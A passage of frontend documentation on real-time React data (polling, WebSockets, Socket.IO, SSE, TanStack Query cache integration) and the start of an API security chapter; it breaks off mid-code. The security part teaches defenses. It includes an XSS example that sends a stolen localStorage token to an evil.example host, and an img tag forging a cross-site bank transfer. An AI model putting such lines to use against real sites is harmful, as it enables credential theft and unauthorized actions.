"Real-time" rarely means zero latency. A 2-second poll feels real-time on a dashboard; a chat app needs sub-100ms. Pick the cheapest transport that meets the latency your feature actually requires.

docs.title: Polling (the simplest option)
docs.text:
Polling means re-fetching on an interval. With TanStack Query v5 you get this for free via refetchInterval — no extra infrastructure required.

import { useQuery } from "@tanstack/react-query";

function fetchPrices(): Promise<Price[]> {
  return fetch("/api/prices").then((res) => {
    if (!res.ok) throw new Error("Failed to load prices");
    return res.json();
  });
}

export function PriceTicker() {
  const { data, isPending } = useQuery({
    queryKey: ["prices"],
    queryFn: fetchPrices,
    refetchInterval: 5000,              // poll every 5s
    refetchIntervalInBackground: false, // pause when tab is hidden
  });

  if (isPending) return <p>Loading…</p>;
  return <PriceList prices={data} />;
}

refetchInterval can also be a function, so you can back off or stop polling based on the latest data:

useQuery({
  queryKey: ["job", jobId],
  queryFn: () => fetchJob(jobId),
  // poll while running, stop once finished
  refetchInterval: (query) =>
    query.state.data?.status === "done" ? false : 2000,
});

docs.title: When polling is the right call
docs.text:
• Updates are infrequent (minutes) or staleness of a few seconds is acceptable.
  • You don't control the backend, or it only speaks REST.
  • You want zero new infrastructure and trivial scaling (it's just HTTP).

docs.title: When to reach for real-time push instead
docs.text:
Symptom of "polling is wrong" Better fit You poll every 1–2s to feel "live" WebSockets / SSE Most polls return no change (wasted requests) SSE / WS You need to send data continuously too WebSockets / Socket.IO Server-to-client only (feeds, logs) SSE Many tabs/users hammering the API Push (one connection, server fans out)

Polling cost is multiplicative

1,000 users polling every 2s = 500 requests/second of mostly-empty responses. A single push connection per user delivers updates only when they exist. Below a few seconds of interval, push is usually both faster and cheaper.

docs.title: 2️⃣ WebSockets — The Raw Browser API
docs.text: WebSockets give you a single, full-duplex (two-way) persistent connection. After an HTTP handshake that "upgrades" the connection, both sides can send messages at any time with very low overhead.

docs.title: The bare API
docs.text:
const socket = new WebSocket("wss://api.example.com/ws");

socket.onopen = () => socket.send(JSON.stringify({ type: "hello" }));
socket.onmessage = (event) => console.log("received", JSON.parse(event.data));
socket.onerror = (event) => console.error("ws error", event);
socket.onclose = (event) => console.log("closed", event.code, event.reason);

// later
socket.close(1000, "done"); // 1000 = normal closure

Always use wss:// in production

ws:// is unencrypted and will be blocked by browsers on HTTPS pages (mixed content). Use wss:// — the TLS-secured variant — everywhere except local development.

docs.title: Naive React usage (and why it breaks)
docs.text:
A first attempt usually looks like this — and it has a subtle bug:

// ⚠️ Buggy: no cleanup, reconnects on every render that changes `url`
useEffect(() => {
  const ws = new WebSocket(url);
  ws.onmessage = (e) => setMessages((m) => [...m, JSON.parse(e.data)]);
}, [url]);

Problems:

  1. No cleanup — the socket is never closed, so you leak connections on unmount and in React 18 Strict Mode (which mounts → unmounts → mounts).
  2. Stale closures — handlers capture old state.
  3. No reconnection — a dropped connection stays dead.

The fix is a dedicated hook.

docs.title: 3️⃣ A Reusable useWebSocket Hook
docs.text:
This hook handles connection lifecycle, auto-reconnection with exponential backoff, a heartbeat to detect dead connections, and clean teardown on unmount.

// useWebSocket.ts
import { useCallback, useEffect, useRef, useState } from "react";

type Status = "connecting" | "open" | "closing" | "closed";

interface Options {
  /** Called for every parsed message. */
  onMessage?: (data: unknown) => void;
  /** Max reconnection attempts before giving up. */
  maxRetries?: number;
  /** Send a ping every N ms to keep the connection alive. */
  heartbeatMs?: number;
}

export function useWebSocket(url: string, options: Options = {}) {
  const { onMessage, maxRetries = 10, heartbeatMs = 25_000 } = options;

  const [status, setStatus] = useState<Status>("closed");
  const wsRef = useRef<WebSocket | null>(null);
  const retriesRef = useRef(0);
  const reconnectTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
  const heartbeatTimer = useRef<ReturnType<typeof setInterval> | null>(null);
  // Keep the latest callback without re-running the connect effect.
  const onMessageRef = useRef(onMessage);
  onMessageRef.current = onMessage;
  // Lets cleanup distinguish an intentional close from a dropped connection.
  const shouldReconnect = useRef(true);

  const connect = useCallback(() => {
    setStatus("connecting");
    const ws = new WebSocket(url);
    wsRef.current = ws;

    ws.onopen = () => {
      retriesRef.current = 0; // reset backoff on success
      setStatus("open");

      // Heartbeat: keep proxies/load balancers from killing an idle socket.
      heartbeatTimer.current = setInterval(() => {
        if (ws.readyState === WebSocket.OPEN) {
          ws.send(JSON.stringify({ type: "ping" }));
        }
      }, heartbeatMs);
    };

    ws.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        if (data?.type === "pong") return; // ignore heartbeat replies
        onMessageRef.current?.(data);
      } catch {
        onMessageRef.current?.(event.data); // non-JSON payloads
      }
    };

    ws.onclose = () => {
      setStatus("closed");
      if (heartbeatTimer.current) clearInterval(heartbeatTimer.current);

      // Reconnect with exponential backoff + jitter, unless we closed on purpose.
      if (shouldReconnect.current && retriesRef.current < maxRetries) {
        const attempt = retriesRef.current++;
        const base = Math.min(1000 * 2 ** attempt, 30_000); // cap at 30s
        const jitter = Math.random() * 1000; // avoid thundering herd
        reconnectTimer.current = setTimeout(connect, base + jitter);
      }
    };

    ws.onerror = () => ws.close(); // force onclose → triggers reconnect path
  }, [url, maxRetries, heartbeatMs]);

  const send = useCallback((payload: unknown) => {
    const ws = wsRef.current;
    if (ws?.readyState === WebSocket.OPEN) {
      ws.send(typeof payload === "string" ? payload : JSON.stringify(payload));
      return true;
    }
    return false; // not connected — caller can queue/ignore
  }, []);

  useEffect(() => {
    shouldReconnect.current = true;
    connect();

    // Cleanup: stop reconnecting, clear timers, close the socket.
    return () => {
      shouldReconnect.current = false;
      if (reconnectTimer.current) clearTimeout(reconnectTimer.current);
      if (heartbeatTimer.current) clearInterval(heartbeatTimer.current);
      wsRef.current?.close(1000, "component unmounted");
      wsRef.current = null;
    };
  }, [connect]);

  return { status, send };
}

docs.title: Using it
docs.text:
function ChatRoom() {
  const [messages, setMessages] = useState<Message[]>([]);

  const { status, send } = useWebSocket("wss://api.example.com/chat", {
    onMessage: (data) => setMessages((prev) => [...prev, data as Message]),
  });

  return (
    <div>
      <ConnectionBadge status={status} />
      <MessageList messages={messages} />
      <button
        disabled={status !== "open"}
        onClick={() => send({ type: "message", text: "Hi!" })}
      >
        Send
      </button>
    </div>
  );
}

docs.title: Why these patterns matter
docs.text:
• onMessageRef — we store the callback in a ref so a changing onMessage prop doesn't tear down and rebuild the socket on every render.
  • Exponential backoff + jitter — 1s, 2s, 4s, 8s… capped at 30s, plus random jitter so a thousand clients don't all reconnect on the same tick.
  • Heartbeat — load balancers and proxies often drop sockets idle for ~30–60s. A periodic ping keeps the connection (and detects half-open ones).
  • Cleanup — the effect's return function flips shouldReconnect off, clears timers, and closes the socket. This is what makes Strict Mode and unmount safe.

docs.title: 4️⃣ Socket.IO
docs.text:
The raw WebSocket API is low-level: no rooms, no automatic reconnection, no fallback transport, no event names — you build all of that yourself. Socket.IO is a battle-tested library (client + server) that adds:

  • Automatic reconnection with backoff (built in).
  • Named events instead of one big onmessage switch.
  • Rooms and namespaces for grouping clients (e.g. one room per chat).
  • Acknowledgements (request/response over the socket).
  • Automatic fallback to HTTP long-polling when WebSockets are blocked.

Socket.IO is not plain WebSocket

A Socket.IO client cannot talk to a raw WebSocket server and vice versa — they use different framing/handshake protocols. Use the Socket.IO client only with a Socket.IO server.

docs.title: Client setup
docs.text:
npm install socket.io-client

// socket.ts — a single shared instance
import { io, Socket } from "socket.io-client";

export const socket: Socket = io("https://api.example.com", {
  autoConnect: false,          // connect manually after auth
  transports: ["websocket"],   // skip the polling handshake if WS is fine
  reconnectionAttempts: 10,
  reconnectionDelay: 1000,     // backoff is handled for you
});

docs.title: Events and rooms
docs.text:
socket.connect();

// listen
socket.on("message", (msg) => console.log("new message", msg));
socket.on("connect", () => console.log("connected", socket.id));
socket.on("disconnect", (reason) => console.log("disconnected", reason));

// emit
socket.emit("join_room", { roomId: "general" });
socket.emit("message", { roomId: "general", text: "Hello room!" });

// emit with acknowledgement (server calls the callback)
socket.emit("message", payload, (ack) => {
  if (ack.ok) console.log("delivered", ack.id);
});

Rooms are a server-side concept; the client just asks to join/leave and the server decides who receives a broadcast:

// server.js (Node) — for reference
io.on("connection", (socket) => {
  socket.on("join_room", ({ roomId }) => socket.join(roomId));
  socket.on("message", ({ roomId, text }) => {
    // broadcast to everyone in the room except the sender
    socket.to(roomId).emit("message", { text, from: socket.id });
  });
});

docs.title: React integration
docs.text:
Wrap the shared instance in a hook so components subscribe to events with proper cleanup (otherwise listeners stack up on every render/remount):

// useSocketEvent.ts
import { useEffect } from "react";
import { socket } from "./socket";

export function useSocketEvent<T>(event: string, handler: (data: T) => void) {
  useEffect(() => {
    socket.on(event, handler);
    return () => {
      socket.off(event, handler); // remove THIS listener on unmount
    };
  }, [event, handler]);
}

function Room({ roomId }: { roomId: string }) {
  const [messages, setMessages] = useState<Message[]>([]);

  // join/leave the room with the component lifecycle
  useEffect(() => {
    socket.connect();
    socket.emit("join_room", { roomId });
    return () => {
      socket.emit("leave_room", { roomId });
      // Don't disconnect the shared socket here if other components use it.
    };
  }, [roomId]);

  useSocketEvent<Message>("message", (msg) =>
    setMessages((prev) => [...prev, msg]),
  );

  const send = (text: string) => socket.emit("message", { roomId, text });

  return <Chat messages={messages} onSend={send} />;
}

Use a single shared socket, not one per component

Creating io() inside a component opens a new connection every mount. Define one instance in a module (or a Context provider) and have components subscribe to events on it. Disconnect once — typically on logout or app unmount.

docs.title: 5️⃣ Server-Sent Events (SSE)
docs.text:
SSE is the often-forgotten middle ground. It's a one-way stream from server to client over a normal HTTP connection, using the built-in EventSource API. The browser handles reconnection and event IDs for you.

const es = new EventSource("/api/notifications");

es.onmessage = (e) => console.log("data:", e.data);                // default event
es.addEventListener("price", (e) => console.log("price", e.data)); // named event
es.onerror = () => console.log("connection lost (browser will retry)");

es.close(); // stop listening

docs.title: A useEventSource hook
docs.text:
// useEventSource.ts
import { useEffect, useRef, useState } from "react";

export function useEventSource<T>(
  url: string,
  onMessage: (data: T) => void,
) {
  const [connected, setConnected] = useState(false);
  const onMessageRef = useRef(onMessage);
  onMessageRef.current = onMessage;

  useEffect(() => {
    const es = new EventSource(url, { withCredentials: true });

    es.onopen = () => setConnected(true);
    es.onmessage = (event) => {
      try {
        onMessageRef.current(JSON.parse(event.data) as T);
      } catch {
        onMessageRef.current(event.data as unknown as T);
      }
    };
    es.onerror = () => setConnected(false); // EventSource auto-reconnects

    return () => es.close(); // cleanup on unmount
  }, [url]);

  return { connected };
}

function Notifications() {
  const [items, setItems] = useState<Notice[]>([]);
  const { connected } = useEventSource<Notice>("/api/notifications", (n) =>
    setItems((prev) => [n, ...prev]),
  );
  return <NoticeFeed items={items} connected={connected} />;
}

docs.title: When to prefer SSE over WebSockets
docs.text:
Prefer SSE when… Prefer WebSockets when… Data flows server → client only You need to send data too (chat, cursors) You want auto-reconnect for free You need binary frames or sub-protocols Updates are text/JSON (feeds, logs, progress) You need very high message rates both ways You want to ride existing HTTP/2 infra You're already on Socket.IO

SSE quirks to remember

  • SSE is text only (UTF-8) — no binary.
  • Over HTTP/1.1, browsers cap connections per domain (~6), so many SSE streams can starve other requests. HTTP/2 removes this limit — strongly preferred.
  • The native EventSource cannot send custom headers (e.g. Authorization). Pass auth via cookies (withCredentials) or a query param, or use a polyfill like event-source-polyfill that supports headers.

docs.title: 6️⃣ Real-Time + TanStack Query v5
docs.text:
Here's the key insight: TanStack Query is already your cache. Don't keep a separate useState array of live data that drifts out of sync with your queries. Instead, let the socket write into the Query cache, and your components keep reading from useQuery exactly as before.

Two patterns: surgically update the cache (setQueryData) or invalidate and let Query refetch.

docs.title: Pattern A — setQueryData (no refetch)
docs.text:
Apply the pushed update directly to the cache. Fast and bandwidth-free.

import { useQuery, useQueryClient } from "@tanstack/react-query";
import { useWebSocket } from "./useWebSocket";

function useLiveMessages(roomId: string) {
  const queryClient = useQueryClient();

  useWebSocket(`wss://api.example.com/rooms/${roomId}`, {
    onMessage: (data) => {
      const msg = data as Message;
      queryClient.setQueryData<Message[]>(["messages", roomId], (old = []) => [
        ...old,
        msg,
      ]);
    },
  });
}

function Room({ roomId }: { roomId: string }) {
  useLiveMessages(roomId); // wires the socket into the cache
  const { data: messages } = useQuery({
    queryKey: ["messages", roomId],
    queryFn: () => fetchMessages(roomId),
  });
  return <MessageList messages={messages ?? []} />;
}

docs.title: Pattern B — invalidateQueries (refetch source of truth)
docs.text:
When the push only signals "something changed" (not the full new value), or you don't trust the payload to be complete, invalidate and let Query refetch:

queryClient.invalidateQueries({ queryKey: ["orders"] });

Which pattern?

Use setQueryData when the message contains the full, trustworthy new state — it's instant and avoids a round trip. Use invalidateQueries when the message is just a notification, or when computing the new cache value is error-prone (pagination, sorting, server-side filtering).

docs.title: Streaming updates with streamedQuery (v5.x)
docs.text:
TanStack Query v5 ships a streamedQuery helper that accumulates results from an async iterable (e.g. a streamed LLM response or a chunked feed) into the query's data over time:

import { useQuery } from "@tanstack/react-query";
import { streamedQuery } from "@tanstack/react-query";

const { data } = useQuery({
  queryKey: ["chat-stream", chatId],
  queryFn: streamedQuery({
    streamFn: () => fetchChatChunks(chatId), // returns an AsyncIterable<Chunk>
  }),
});
// `data` is an array that grows as chunks arrive

This is ideal for token-by-token AI responses or progressively loaded lists, while still benefiting from Query's caching, status flags, and devtools.

docs.title: 7️⃣ Optimistic UI for Real-Time
docs.text:
Real-time apps feel instant when the sender's own action shows immediately, before the server echoes it back. With a socket you typically:

  1. Add the message to the cache right away with a temporary id and pending flag.
  2. Emit it to the server.
  3. Reconcile when the server's broadcast (with the real id) arrives.
function useSendMessage(roomId: string) {
  const queryClient = useQueryClient();
  const { send } = useWebSocket(`wss://api.example.com/rooms/${roomId}`, {
    onMessage: (data) => {
      const incoming = data as Message;
      queryClient.setQueryData<Message[]>(["messages", roomId], (old = []) => {
        // Replace the optimistic placeholder if its tempId matches; else append.
        const exists = old.some((m) => m.tempId === incoming.tempId);
        return exists
          ? old.map((m) => (m.tempId === incoming.tempId ? incoming : m))
          : [...old, incoming];
      });
    },
  });

  return (text: string) => {
    const tempId = crypto.randomUUID();
    const optimistic: Message = { id: tempId, tempId, text, pending: true };

    // 1. show immediately
    queryClient.setQueryData<Message[]>(["messages", roomId], (old = []) => [
      ...old,
      optimistic,
    ]);
    // 2. send (server should echo back the same tempId)
    send({ type: "message", text, tempId });
  };
}

Always plan the rollback

If the send fails or times out, mark the optimistic message as failed (or remove it) so users can retry. Optimistic UI that silently loses a message is worse than a spinner. With useMutation you get onError rollback for free; for raw sockets, track a timeout and reconcile manually.

docs.title: 8️⃣ Presence & Typing Indicators
docs.text: Presence ("who's online") and typing indicators are classic socket features. The trick is throttling outbound events and expiring stale state.

docs.title: Typing indicator
docs.text:
function useTyping(roomId: string, send: (p: unknown) => void) {
  const lastSent = useRef(0);

  // Throttle: emit "typing" at most once per second.
  const onType = () => {
    const now = Date.now();
    if (now - lastSent.current > 1000) {
      send({ type: "typing", roomId });
      lastSent.current = now;
    }
  };
  return onType;
}

On the receiving side, show the indicator and auto-clear it if no new typing event arrives within a few seconds (the sender may have closed the tab):

function TypingIndicator({ roomId }: { roomId: string }) {
  const [typers, setTypers] = useState<Record<string, number>>({});

  useSocketEvent<{ userId: string }>("typing", ({ userId }) => {
    setTypers((prev) => ({ ...prev, [userId]: Date.now() }));
  });

  // Expire entries older than 3s.
  useEffect(() => {
    const id = setInterval(() => {
      setTypers((prev) => {
        const now = Date.now();
        return Object.fromEntries(
          Object.entries(prev).filter(([, t]) => now - t < 3000),
        );
      });
    }, 1000);
    return () => clearInterval(id); // cleanup the interval
  }, []);

  const names = Object.keys(typers);
  if (names.length === 0) return null;
  return <p className="typing">{names.join(", ")} typing…</p>;
}

docs.title: Presence
docs.text:
Presence usually relies on the server detecting connect/disconnect. Socket.IO's disconnect event (and rooms) makes this straightforward:

// server.js (reference)
io.on("connection", (socket) => {
  io.emit("presence", { userId: socket.userId, online: true });
  socket.on("disconnect", () =>
    io.emit("presence", { userId: socket.userId, online: false }),
  );
});

Heartbeats power presence

A user who loses Wi-Fi doesn't send a clean disconnect. Rely on the transport's heartbeat/ping timeout (Socket.IO does this automatically) to flip them offline, rather than trusting an explicit "goodbye" message.

docs.title: Authenticating the handshake (token-based)
docs.text:
You cannot rely on Authorization headers for the browser WebSocket / EventSource APIs (they don't accept custom headers). The common, robust options:

  1. Cookie-based — if you use HttpOnly cookies, the browser sends them on the handshake automatically. Best for same-site apps.
  2. Token in the connect payload — send a short-lived token after the socket opens and let the server validate before allowing any events.
  3. Token via auth/query field — Socket.IO exposes an auth option; raw WS often uses a query param (kept short-lived because URLs get logged).
// Socket.IO: token via the `auth` field (validated in server middleware)
export const socket = io("https://api.example.com", {
  autoConnect: false,
  auth: { token: getAccessToken() },
});

// Refresh the token before reconnecting (tokens expire):
socket.on("connect_error", async (err) => {
  if (err.message === "auth_expired") {
    socket.auth = { token: await refreshAccessToken() };
    socket.connect();
  }
});

// server.js — Socket.IO auth middleware (reference)
io.use((socket, next) => {
  const token = socket.handshake.auth.token;
  try {
    socket.userId = verifyJwt(token).sub;
    next();
  } catch {
    next(new Error("auth_expired"));
  }
});

Short-lived tokens for sockets

Long-lived sockets outlive access tokens. Use short-lived access tokens and re-authenticate on reconnect, or validate the token once at handshake and trust the established connection until it drops. Never put refresh tokens in a URL.

docs.title: Scaling across multiple servers
docs.text:
A single Node process holds sockets in memory, so a broadcast only reaches clients on that process. When you run multiple instances (you will), you need:

  • Sticky sessions at the load balancer (a client must reach the same instance for the duration of its connection — especially for Socket.IO's HTTP polling fallback).
  • A pub/sub adapter (e.g. the Socket.IO Redis adapter) so a message emitted on instance A is fanned out to clients connected to instances B and C.
// server.js — Redis adapter for horizontal scaling (reference)
import { createAdapter } from "@socket.io/redis-adapter";
import { createClient } from "redis";

const pub = createClient({ url: process.env.REDIS_URL });
const sub = pub.duplicate();
await Promise.all([pub.connect(), sub.connect()]);
io.adapter(createAdapter(pub, sub));

Frontend takeaways for scale

You rarely write this backend code, but it affects you: design messages to be idempotent (clients may receive a message twice after a reconnect), include a monotonic id or timestamp so the client can dedupe/reorder, and never assume strict ordering across reconnects.

docs.title: 🔟 Cleanup — The Non-Negotiable
docs.text:
Every example above closes its connection in a useEffect cleanup. This is the single most common real-time bug source. Get it wrong and you leak sockets, double up event listeners, and break in React 18/19 Strict Mode.

useEffect(() => {
  const ws = new WebSocket(url);
  // …wire up handlers…

  return () => {
    ws.close(1000, "unmount"); // ← REQUIRED
  };
}, [url]);

Checklist for any real-time hook:

  • [x] Close the connection (ws.close(), es.close(), or socket.off(...)) in the cleanup function.
  • [x] Clear all timers — reconnect timeouts and heartbeat intervals.
  • [x] Remove the specific listener with off, not a blanket teardown of a shared socket other components still use.
  • [x] Stop reconnection on intentional unmount (the shouldReconnect flag).
  • [x] Test in Strict Mode — if it survives mount → unmount → mount cleanly, it'll survive production.

Strict Mode is a feature, not a bug

React 18/19 deliberately double-invokes effects in development to surface missing cleanup. If your socket "connects twice" in dev, that is the warning that your cleanup is incomplete — fix the hook, don't disable Strict Mode.

docs.title: 1️⃣1️⃣ Summary
docs.text:
Need Reach for Occasional updates, REST-only backend TanStack Query refetchInterval (polling) Two-way, low-latency (chat, games, cursors) Socket.IO (or raw WS + useWebSocket) One-way server → client (feeds, logs, progress) SSE (useEventSource) Keeping live data and cache in sync setQueryData / invalidateQueries Streaming/growing results (AI tokens, chunks) streamedQuery Instant sender feedback Optimistic update + reconcile on echo

Golden rules:

  • Pick the cheapest transport that meets your real latency need — don't reach for WebSockets when a 5s poll or SSE will do.
  • Let TanStack Query own the data; sockets just write into the cache.
  • Always clean up connections, listeners, and timers on unmount.
  • For sockets at scale: short-lived auth tokens, sticky sessions, a pub/sub adapter, and idempotent, ordered messages.

docs.title: API Security & Best Practices
docs.text:
Security is not a feature you bolt on at the end — it is a property of how you design data flow, store credentials, and trust input. This chapter covers the frontend's slice of API security: what a React/SPA can realistically defend against, what it cannot defend against, and the practices that keep you out of trouble.

Where the frontend fits

The browser is a hostile, fully-inspectable environment. Anything shipped to the client — code, "secrets", validation rules — can be read, modified, and replayed by a determined user. The frontend's job is to protect the user (from XSS, from leaking their data) and to be a well-behaved client. Authoritative security always lives on the server. This chapter never asks the client to enforce something the server should.

This chapter builds on 14.3 Authentication and keeps the same stance: HttpOnly-cookie-first for tokens, and never localStorage for credentials without a loud caveat.

docs.title: 1️⃣ The Browser Threat Model
docs.text:
Before mitigations, know what you are defending against. For a React SPA the realistic threats are:

Threat Attacker goal Who it hurts Frontend can mitigate? XSS (Cross-Site Scripting) Run JS in your origin Your users ✔️ Yes — primary frontend job CSRF (Cross-Site Request Forgery) Make the browser send authed requests Your users ⚠️ Partly — cookies + tokens MITM (Man-in-the-middle) Read/alter traffic Your users ✔️ HTTPS/HSTS Credential theft Steal tokens/session Your users ✔️ Storage choice Secret leakage Read API keys in bundle You / your bill ✔️ Don't ship secrets Supply-chain Malicious npm dependency Everyone ✔️ Audit + lockfiles Abuse / scraping / brute force Hammer your API Your server ❌ Server-side (frontend can soften UX)

The golden rule

Never trust the client. A request can come from your React app, from curl, from a modified bundle, or from an attacker replaying captured traffic. Every authorization check, every business rule, every validation that matters must be re-enforced on the server. Client-side checks exist for UX, not security.

docs.title: The "same-origin" mental model
docs.text: The browser groups everything by origin = scheme + host + port. Code, cookies, and storage are partitioned by origin. Most browser security (the Same-Origin Policy, cookie scoping, storage isolation) is about keeping origins from reading each other's stuff. XSS is dangerous precisely because it runs inside your origin, so it bypasses all of that.

docs.title: 2️⃣ Cross-Site Scripting (XSS)
docs.text: XSS is the single most important threat for an SPA, because XSS defeats almost every other defense. If an attacker can run JavaScript in your origin, they can read anything JS can read, call your API as the user, and exfiltrate data.

docs.title: How XSS happens
docs.text:
XSS occurs when untrusted data is rendered as executable markup/script instead of inert text.

  • Stored XSS — malicious input saved server-side, then served to others (e.g. a comment containing <script>).
  • Reflected XSS — malicious input echoed straight back into the page (e.g. a search term in the URL).
  • DOM-based XSS — the client itself writes untrusted data into a dangerous sink (innerHTML, eval, dangerouslySetInnerHTML).

docs.title: Why React is mostly safe by default
docs.text:
React escapes any string you interpolate into JSX. This is safe:

// SAFE — React escapes the string; <script> renders as visible text, not code
function Comment({ body }) {
  return <p>{body}</p>;
}

The escape hatch is where danger lives:

// DANGER — bypasses React's escaping entirely
function Article({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

dangerouslySetInnerHTML is named that for a reason

Only use it on HTML you have sanitized or that you fully control. Never feed it raw user input or an unsanitized API response. The same applies to eval, new Function, setTimeout("...string..."), el.innerHTML, el.outerHTML, and document.write.

docs.title: Why XSS breaks localStorage token storage
docs.text:
This is the crux of the auth stance in 14.3. localStorage and sessionStorage are readable by any JavaScript running on your origin:

// Anything that runs an XSS payload can do exactly this:
const stolen = localStorage.getItem("accessToken");
navigator.sendBeacon("https://evil.example/collect", stolen);

A token in localStorage is a bearer token sitting in plaintext, reachable by script. One XSS bug = full account takeover, and the stolen token works from the attacker's own machine until it expires.

The localStorage caveat (do not skip this)

localStorage is convenient but not appropriate for credentials (access tokens, refresh tokens, session IDs) unless you fully accept the XSS risk. An HttpOnly cookie is unreadable by JavaScript, so even successful XSS cannot exfiltrate the raw token. Prefer HttpOnly cookies; if you must hold an access token in JS, keep it in memory only (see §5), never persisted.

docs.title: 1. Output encoding (let React do it)
docs.text: Render data as text. Avoid the dangerous sinks above. If you never call dangerouslySetInnerHTML, React's automatic escaping handles the bulk of XSS for you.

docs.title: 2. Sanitize when you must render HTML
docs.text:
If you genuinely need to render user-authored HTML (rich-text comments, CMS content), sanitize it with a vetted library — DOMPurify — and never roll your own regex "sanitizer".

import DOMPurify from "dompurify";

function RichContent({ untrustedHtml }) {
  // Strips <script>, event handlers (onerror, onclick...), javascript: URLs, etc.
  const clean = DOMPurify.sanitize(untrustedHtml, { USE_PROFILES: { html: true } });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

Watch out for href/src injection

Sanitizing tags isn't enough. A javascript: URL in an <a href> or a data: URL in an <img src> is also script execution. Validate URL schemes; allow only http, https, mailto, tel.

const SAFE = /^(https?:|mailto:|tel:)/i;
const safeHref = (url) => (SAFE.test(url) ? url : "#");
<a href={safeHref(link.url)} rel="noopener noreferrer">{link.label}</a>

docs.title: 3. Content Security Policy (CSP) — defense in depth
docs.text:
A CSP is an HTTP response header that tells the browser which sources of script/style/etc. are allowed. It is a second line of defense: even if an attacker injects a <script>, a strict CSP can stop it from executing or from phoning home.

Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  connect-src 'self' https://api.example.com;
  img-src 'self' data: https:;
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none'

CSP is a server header, and 'unsafe-inline' undermines it

A CSP must be sent by the server (or a strict meta tag for a subset of directives). Avoid 'unsafe-inline' and 'unsafe-eval' in script-src — they re-open the door XSS walks through. Modern best practice is a nonce-based or hash-based CSP. Note that some bundler/dev setups inject inline scripts; configure CSP for production builds and test it.

docs.title: 3️⃣ Cross-Site Request Forgery (CSRF)
docs.text:
CSRF tricks a logged-in user's browser into making an authenticated request the user didn't intend — because the browser automatically attaches cookies to requests to your domain, regardless of which site initiated them.

CSRF only matters for ambient credentials

CSRF exploits credentials the browser sends automatically: cookies, HTTP Basic auth, client certs. If you authenticate with an Authorization: Bearer header that JS must add manually, a cross-site form/image cannot add that header, so classic CSRF doesn't apply. This is a real trade-off of cookie auth — and the reason cookie auth needs CSRF defenses.

<!-- On evil.example, a victim who is logged into bank.example loads this: -->
<img src="https://bank.example/api/transfer?to=attacker&amount=1000" />
<!-- The browser attaches bank.example's session cookie automatically. -->

docs.title: Defense 1 — SameSite cookies (your first line)
docs.text:
SameSite tells the browser not to send the cookie on cross-site requests.

// server
res.cookie("token", jwt, {
  httpOnly: true,
  secure: true,
  sameSite: "strict", // or "lax"
});
Value Cross-site behavior Use when Strict Cookie never sent cross-site (even top-level navigation) Max safety; can break inbound links into authed pages Lax Sent on top-level GET navigations, not on cross-site POST/fetch Sensible default for most apps None Always sent — requires Secure Cross-origin APIs, embedded widgets

SameSite=None needs Secure and brings back CSRF risk

If your API is on a different site and you set SameSite=None, the cookie is sent cross-site again — so you must add CSRF tokens (below). SameSite is great but is not a complete solution alone: browser defaults vary, and Lax still allows cross-site top-level GETs.

docs.title: Defense 2 — CSRF tokens (synchronizer token pattern)
docs.text:
The server issues an unpredictable token tied to the session; the client must echo it back in a header (which a cross-site attacker cannot set). The attacker can't read the token (Same-Origin Policy), so they can't forge the request.

// The CSRF token is delivered in a NON-HttpOnly cookie (readable by JS) or via an endpoint,
// then sent back as a header. The SESSION token stays HttpOnly.
import axios from "axios";

// axios has built-in support: read token from a cookie, attach it as a header
const api = axios.create({
  baseURL: "https://api.example.com",
  withCredentials: true,
  xsrfCookieName: "XSRF-TOKEN",   // cookie the server sets (JS-readable)
  xsrfHeaderName: "X-XSRF-TOKEN", // header axios echoes back
});

docs.title: Defense 3 — Double-submit cookie
docs.text:
A stateless variant: the server sets a random value in a (JS-readable) cookie; the client copies it into a request header. The server checks that cookie value === header value. Because cross-site script can't read your cookie or set custom headers on a cross-origin request, the values won't match for a forged request.

Don't confuse the two cookies

With CSRF tokens you end up with two cookies: the HttpOnly session/auth cookie (the actual credential, JS can't read it) and a separate, readable CSRF cookie whose value is echoed in a header. Keeping them distinct is the whole point — and it's why the auth credential stays HttpOnly even when CSRF tokens are in play.

Defense in depth

Use SameSite=Lax/Strict and CSRF tokens for cookie-based sessions. Belt and suspenders is correct here.

docs.title: 4️⃣ HTTPS & HSTS
docs.text:
Everything above is moot if traffic travels in plaintext — a network attacker can read cookies, steal tokens, and inject scripts.

  • HTTPS everywhere. Encrypts traffic, prevents tampering, and is a prerequisite for Secure cookies, HTTP/2, service workers, and most modern web APIs.
  • HSTS (Strict-Transport-Security) tells browsers to only ever use HTTPS for your domain, defeating downgrade and SSL-strip attacks.
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload

Never send credentials over HTTP

A Secure cookie is only sent over HTTPS — good. But also ensure your app itself is served over HTTPS and redirects HTTP → HTTPS. In production, mixed content (an HTTPS page loading HTTP resources) is blocked by browsers and breaks the page; fix it, don't disable the warning.

docs.title: 5️⃣ Secure Token Storage Trade-offs
docs.text:
This is the most-argued topic in SPA security. The honest answer: every option is a trade-off, and the right default is the one from 14.3 — HttpOnly cookies.

Storage XSS-safe? CSRF-safe? Survives reload? Sent automatically? Verdict HttpOnly cookie ✔️ JS can't read it ⚠️ Needs SameSite + CSRF token ✔️ Yes ✔️ Yes (by browser) ⭐ Recommended In-memory (JS variable / React state) ⚠️ Readable by XSS, but vanishes on reload (smaller window) ✔️ Not auto-sent ❌ No (lost on refresh) ❌ Manual header ✔️ Good for access tokens localStorage ❌ Fully readable by any script ✔️ Not auto-sent ✔️ Yes ❌ Manual header ❌ Avoid for credentials sessionStorage ❌ Readable by script (per-tab) ✔️ Not auto-sent ⚠️ Per-tab only ❌ Manual header ❌ Avoid for credentials

docs.title: The recommended pattern
docs.text:
Best of both worlds

  • Refresh token → HttpOnly, Secure, SameSite cookie. Never touches JavaScript. Used only against /refresh.
  • Access token → in memory (a module variable or auth context), short-lived (5–15 min). On page reload, silently call /refresh to get a fresh one.
  • This keeps the long-lived credential out of JS entirely, and limits the blast radius of the short-lived one.
// auth-store.js — access token lives in memory only, never persisted
let accessToken = null;
export const setAccessToken = (t) => { accessToken = t; };
export const getAccessToken = () => accessToken;

// api.js — attach it via interceptor; refresh uses the HttpOnly cookie
import axios from "axios";
import { getAccessToken, setAccessToken } from "./auth-store";

export const api = axios.create({
  baseURL: import.meta.env.VITE_API_URL,
  withCredentials: true, // send the HttpOnly refresh cookie to /refresh
});

api.interceptors.request.use((config) => {
